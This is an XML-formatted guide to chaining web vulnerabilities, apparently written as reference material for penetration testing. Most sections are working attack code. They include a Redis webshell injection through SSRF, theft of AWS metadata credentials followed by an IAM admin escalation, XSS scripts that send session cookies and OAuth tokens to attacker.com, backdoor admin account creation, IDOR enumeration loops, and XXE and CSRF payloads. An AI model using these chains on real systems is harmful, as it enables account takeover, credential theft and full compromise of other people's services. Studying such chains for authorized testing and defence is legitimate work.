<chained_vulnerabilities_guide>
<title>CHAINED VULNERABILITIES EXPLOITATION</title>

<critical>Vulnerability chaining combines multiple weaknesses to achieve high-impact exploitation. Individual vulnerabilities may seem low-severity in isolation, but when chained together can lead to Remote Code Execution, Account Takeover, or complete system compromise. Testing must identify exploit chains and demonstrate amplified impact.</critical>

<scope>
- SSRF to RCE chains
- XSS to Account Takeover
- IDOR + Information Disclosure combinations
- Open Redirect to OAuth token theft
- XXE to SSRF to internal access
- CSRF + Self-XSS exploitation
- Privilege escalation chains
- Authentication bypass to data exfiltration
</scope>

<methodology>
1. Map all available attack surfaces and vulnerabilities.
2. Identify relationships between vulnerabilities.
3. Design multi-step exploitation paths.
4. Test each step in the chain independently.
5. Execute full chain to demonstrate maximum impact.
6. Document each step with clear reproducibility.
</methodology>

<ssrf_chains>
<ssrf_to_rce>
{% raw %}
# SSRF to RCE chain:

# Step 1: SSRF vulnerability
GET /api/fetch?url=http://internal-service:8080/

# Step 2: Discover internal services via SSRF
# Port scan internal network
url=http://192.168.1.10:22/
url=http://192.168.1.10:3306/
url=http://192.168.1.10:6379/  # Redis

# Step 3: Exploit Redis via SSRF
# Redis command injection
url=http://192.168.1.10:6379/%0D%0ASET%20shell%20%22%3C%3Fphp%20system($_GET[%27cmd%27])%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT

# Step 4: Access uploaded shell
GET /shell.php?cmd=id

# Alternative chain via AWS metadata:
# SSRF -> AWS metadata -> IAM credentials -> Lateral movement
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
{% endraw %}
</ssrf_to_rce>

<ssrf_to_cloud>
{% raw %}
# SSRF to cloud exploitation:

# Step 1: SSRF to AWS metadata
url=http://169.254.169.254/latest/meta-data/

# Step 2: Extract IAM role credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}

# Step 3: Use credentials to access AWS services
aws s3 ls --profile stolen
aws dynamodb scan --table-name users --profile stolen

# Step 4: Privilege escalation via IAM
aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
{% endraw %}
</ssrf_to_cloud>
</ssrf_chains>

<xss_chains>
<xss_to_account_takeover>
{% raw %}
# XSS to Account Takeover chain:

# Step 1: Stored XSS vulnerability
POST /api/comments
{"text": "<script src='https://attacker.com/steal.js'></script>"}

# steal.js payload:
// Step 2: Steal session tokens
fetch('/api/user/session', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Step 3: Exfiltrate session
    fetch('https://attacker.com/log?session=' + data.sessionToken);
    
    // Step 4: Change email (account takeover)
    fetch('/api/user/email', {
      method: 'PUT',
      body: JSON.stringify({email: 'attacker@evil.com'}),
      credentials: 'include'
    });
    
    // Step 5: Trigger password reset to new email
    fetch('/api/auth/reset-password', {
      method: 'POST',
      body: JSON.stringify({email: 'attacker@evil.com'}),
      credentials: 'include'
    });
  });

# Alternative: XSS -> OAuth token theft
<script>
  // Steal OAuth token from localStorage/sessionStorage
  var token = localStorage.getItem('oauth_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
{% endraw %}
</xss_to_account_takeover>

<xss_to_admin>
{% raw %}
# XSS to admin panel access:

# Step 1: XSS in admin-viewed content
# (e.g., support ticket, user profile)
POST /support/ticket
{"message": "<script src='https://attacker.com/admin.js'></script>"}

# admin.js:
// Step 2: When admin views, create backdoor account
fetch('/admin/users', {
  method: 'POST',
  body: JSON.stringify({
    username: 'backdoor',
    password: 'secret123',
    role: 'admin'
  }),
  credentials: 'include'
});

// Step 3: Exfiltrate admin session
fetch('https://attacker.com/admin?session=' + document.cookie);

# Step 4: Login as backdoor admin
POST /login
{"username": "backdoor", "password": "secret123"}
{% endraw %}
</xss_to_admin>
</xss_chains>

<idor_chains>
<idor_info_disclosure>
{% raw %}
# IDOR + Information Disclosure chain:

# Step 1: IDOR to enumerate user IDs
for i in {1..1000}; do
  curl "https://api.example.com/user/$i/profile"
done

# Step 2: Discover high-value targets
# Look for admin users, high-privilege accounts
{"user_id": 1, "username": "admin", "role": "administrator"}
{"user_id": 42, "username": "ceo", "role": "executive"}

# Step 3: Information disclosure via IDOR
GET /api/user/1/api-keys
GET /api/user/1/payment-methods
GET /api/user/42/private-documents

# Step 4: Use disclosed information for further attacks
# API keys -> API abuse
# Payment data -> Financial fraud
# Documents -> Social engineering
{% endraw %}
</idor_info_disclosure>

<idor_to_takeover>
{% raw %}
# IDOR to account takeover chain:

# Step 1: IDOR allows viewing reset tokens
GET /api/user/123/password-reset-token
{"token": "abc123xyz"}

# Step 2: Use token to reset other user's password
POST /api/auth/reset-password
{"token": "abc123xyz", "new_password": "hacked123"}

# Alternative chain:
# Step 1: IDOR to modify email
PUT /api/user/123/email
{"email": "attacker@evil.com"}

# Step 2: Trigger password reset
POST /api/auth/forgot-password
{"email": "attacker@evil.com"}

# Step 3: Receive reset link, takeover account
{% endraw %}
</idor_to_takeover>
</idor_chains>

<open_redirect_chains>
<redirect_to_oauth_theft>
{% raw %}
# Open Redirect to OAuth token theft:

# Step 1: Open redirect vulnerability
GET /redirect?url=https://evil.com

# Step 2: OAuth flow abuse
# Normal OAuth flow:
https://app.example.com/oauth/authorize?
  client_id=xxx&
  redirect_uri=https://app.example.com/callback&
  response_type=token

# Attacker modifies redirect_uri using open redirect:
https://app.example.com/oauth/authorize?
  client_id=xxx&
  redirect_uri=https://app.example.com/redirect?url=https://attacker.com/steal&
  response_type=token

# Step 3: User authorizes, token sent to attacker
# Redirect chain:
# https://app.example.com/callback#access_token=xxx
# -> https://app.example.com/redirect?url=https://attacker.com/steal#access_token=xxx
# -> https://attacker.com/steal#access_token=xxx

# Step 4: Attacker uses stolen token
curl -H "Authorization: Bearer xxx" https://api.example.com/user/data
{% endraw %}
</redirect_to_oauth_theft>
</open_redirect_chains>

<xxe_chains>
<xxe_to_ssrf_to_rce>
{% raw %}
# XXE to SSRF to RCE chain:

# Step 1: XXE vulnerability
POST /api/xml-import
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/">
]>
<data>&xxe;</data>

# Step 2: XXE enables SSRF to internal services
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.10:6379/">
]>

# Step 3: Exploit internal service (Redis) via XXE+SSRF
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.10:6379/%0D%0ASET%20shell%20%22webshell%22%0D%0A">
]>

# Step 4: Write webshell, achieve RCE
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/shell.php">
]>
{% endraw %}
</xxe_to_ssrf_to_rce>
</xxe_chains>

<csrf_chains>
<csrf_self_xss>
{% raw %}
# CSRF + Self-XSS chain:

# Step 1: Self-XSS vulnerability
# XSS that only works if victim pastes payload
# Alone: Not exploitable (requires user interaction)

# Step 2: CSRF vulnerability
# Can modify user profile without CSRF token
POST /api/profile
{"bio": "User biography"}

# Step 3: Chain CSRF + Self-XSS
# Use CSRF to inject Self-XSS payload into victim's profile
<form action="https://example.com/api/profile" method="POST">
  <input name="bio" value="<script>fetch('https://attacker.com/?c='+document.cookie)</script>">
</form>
<script>document.forms[0].submit();</script>

# When victim views their own profile: XSS triggers
# No user interaction needed (CSRF automates it)
{% endraw %}
</csrf_self_xss>
</csrf_chains>

<privilege_escalation_chains>
<horizontal_to_vertical>
{% raw %}
# Horizontal to vertical privilege escalation:

# Step 1: Horizontal privilege escalation (IDOR)
GET /api/user/100/profile
# Can view other regular users' profiles

# Step 2: Enumerate to find admin user ID
GET /api/user/1/profile
{"id": 1, "username": "admin", "role": "administrator"}

# Step 3: IDOR allows viewing admin's API key
GET /api/user/1/api-key
{"key": "admin_secret_key_xxx"}

# Step 4: Use admin API key for vertical escalation
curl -H "Authorization: Bearer admin_secret_key_xxx" \
  https://api.example.com/admin/users

# Step 5: Create backdoor admin account
POST /admin/users
Authorization: Bearer admin_secret_key_xxx
{"username": "backdoor", "password": "secret", "role": "admin"}
{% endraw %}
</horizontal_to_vertical>

<parameter_pollution>
{% raw %}
# Parameter pollution privilege escalation:

# Step 1: Regular user profile update
PUT /api/user/profile
{"name": "John Doe", "email": "john@example.com"}

# Step 2: Add role parameter (normally ignored)
PUT /api/user/profile
{"name": "John Doe", "email": "john@example.com", "role": "admin"}

# Step 3: Parameter pollution to bypass filtering
PUT /api/user/profile?user_id=123&user_id=1
{"name": "Attacker"}
# First user_id filtered, second used (admin ID)

# Step 4: Verify privilege escalation
GET /api/user/profile
{"id": 123, "role": "admin"}
{% endraw %}
</parameter_pollution>
</privilege_escalation_chains>

<common_chains>
{% raw %}
# Authentication bypass -> Data exfiltration:
# 1. Auth bypass via SQL injection in login
# 2. Access admin panel
# 3. Export all user data

# File upload -> RCE:
# 1. Upload PHP file with image extension
# 2. Path traversal to executable directory
# 3. Access uploaded file, execute code

# CORS misconfiguration -> Token theft:
# 1. CORS allows evil.com origin
# 2. XSS or phishing to evil.com
# 3. JavaScript fetch with credentials
# 4. Steal tokens, API abuse

# Race condition -> Business logic bypass:
# 1. Race condition in payment processing
# 2. Multiple requests for same discount code
# 3. Negative balance achieved
# 4. Withdraw funds (financial fraud)
{% endraw %}
</common_chains>

<validation>
1. Document each step in the chain with clear reproduction.
2. Show how individual vulnerabilities amplify when combined.
3. Demonstrate the final impact (RCE, account takeover, data breach).
4. Prove that fixing one step breaks the chain.
5. Provide the complete attack scenario with timing and sequence.
</validation>

<false_positives>
- Individual vulnerabilities properly mitigated at each step
- Defense in depth preventing chain completion
- Rate limiting preventing enumeration steps
- CSRF tokens blocking automated chains
- Proper input validation at every stage
- Network segmentation preventing SSRF exploitation
</false_positives>

<impact>
- Complete system compromise via RCE chains
- Mass account takeover through XSS+token theft
- Data breach via IDOR+information disclosure
- Privilege escalation to administrator access
- Cloud infrastructure compromise via SSRF+metadata
- OAuth account hijacking via redirect chains
- Internal network access via XXE+SSRF
</impact>

<pro_tips>
1. Map all vulnerabilities before attempting chains.
2. Test each step independently first.
3. Look for weak points that connect vulnerabilities.
4. SSRF is often a key pivot point to internal services.
5. XSS can be chained with any authenticated action.
6. IDOR enumeration finds high-value targets for further exploitation.
7. Open redirects enable OAuth and token theft.
8. Consider time-based chains (race conditions, session timing).
9. Document complete reproduction steps for each chain.
10. Show both the chain and the individual vulnerabilities.
</pro_tips>

<remember>Vulnerability chains amplify impact beyond individual vulnerabilities. Common chains: SSRF->RCE (via internal services), XSS->Account Takeover (token theft), IDOR->Data Breach (enumeration + access), Open Redirect->OAuth Theft, XXE->SSRF->RCE. Key pivot points: SSRF enables internal access, XSS enables authenticated actions, IDOR enables enumeration and targeting. Always test each step independently, then demonstrate the full chain. Defense requires breaking any single step.</remember>
</chained_vulnerabilities_guide>
